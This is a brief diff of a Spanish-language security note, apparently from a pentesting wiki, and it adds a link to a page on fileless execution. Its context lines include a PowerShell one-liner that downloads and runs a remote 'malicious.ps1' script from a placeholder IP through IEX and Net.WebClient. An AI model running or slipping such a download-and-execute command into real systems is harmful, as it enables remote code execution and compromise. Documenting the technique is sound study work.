@@ -16,3 +16,4 @@ Esto va a ejecutar el comando Get-childItem, pero obviamente a esto se le puede 
 IEX (New-Object Net.WebClient).downloadString('http://IP/malicious.ps1')
 ```
 
+Para una mayor explicación revisar [[Ejecuciones fileless]] 
